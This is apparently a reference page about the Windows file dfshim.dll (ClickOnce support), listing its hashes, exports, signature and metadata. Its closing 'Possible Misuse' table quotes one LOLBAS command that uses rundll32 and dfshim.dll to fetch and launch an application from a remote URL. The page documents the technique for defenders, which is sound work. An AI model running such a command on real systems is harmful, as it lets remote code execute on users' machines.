---
title: dfshim.dll | ClickOnce Application Deployment Support Library
excerpt: What is dfshim.dll?
---

# dfshim.dll 

* File Path: `C:\Windows\SysWOW64\dfshim.dll`
* Description: ClickOnce Application Deployment Support Library

## Hashes

Type | Hash
-- | --
MD5 | `33EEBE89A948E80913684767D2E2FCCB`
SHA1 | `0C95B7668C59710DDEE78EC81065E20D1C2C0901`
SHA256 | `785CD48D1B1046A69224913E17F229ED7B32E4608752C60DDB8CC77D38509F29`
SHA384 | `CF429D268A169770D58646D3A5198F35E4F49DE194992E39FFEDBE0B3A692CF9DF3EF6A3905B13C5D6C0F1D4878B4242`
SHA512 | `3A878968F9F67B299D0DEE0BF67211FC8E1080DFE4F60C65C060219D14B034DA785F25BE946A2CC26C9DBC73A1B68691459EEB700667960C6DCD9C6BCB250968`
SSDEEP | `24576:TTpsIQgDUCbQ0yB37en7Eb4hD8mOYgVgbqrwjgVSgSo9S3:TT+IBpRygnwbCUgR8IMS3`
IMP | `59DFB930FACB30E982DE67DA5B163048`
PESHA1 | `7E0C04F3B6E88C342A8C201A00F87764F7B82CC0`
PE256 | `286010269C5B131051E537F3E0E58975503A5C52F6E065BA29972F3676550242`

## DLL Exports:

Function Name | Ordinal | Type
-- | -- | --
`CleanOnlineAppCache` | 17 | Exported Function
`ShOpenVerbExtensionW` | 14 | Exported Function
`ShOpenVerbExtension` | 13 | Exported Function
`ShOpenVerbApplicationW` | 12 | Exported Function
`ShOpenVerbApplication` | 11 | Exported Function
`ShArpMaintainW` | 10 | Exported Function
`ShArpMaintain` | 9 | Exported Function
`ParseManifest` | 8 | Exported Function
`LaunchApplication` | 7 | Exported Function
`KillService` | 6 | Exported Function
`GetUserStore` | 5 | Exported Function
`GetUserStateManager` | 4 | Exported Function
`GetDeploymentDataFromManifest` | 20 | Exported Function
`GetCurrentActContext` | 3 | Exported Function
`DllGetClassObject` | 19 | Exported Function
`DllCanUnloadNow` | 18 | Exported Function
`CreateCMSFromXml` | 2 | Exported Function
`CreateActContext` | 1 | Exported Function
`ShOpenVerbShortcut` | 15 | Exported Function
`ShOpenVerbShortcutW` | 16 | Exported Function


## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: dfshim.dll
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.19041.1 (WinBuild.160101.0800)
* Product Version: 10.0.19041.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/69
* VirusTotal Link: https://www.virustotal.com/gui/file/785cd48d1b1046a69224913e17f229ed7b32e4608752c60ddb8cc77d38509f29/detection/


## Possible Misuse

*The following table contains possible examples of `dfshim.dll` being misused. While `dfshim.dll` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Dfsvc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dfsvc.yml) | `- Command: rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo ` | 



MIT License. Copyright (c) 2020 Strontic.


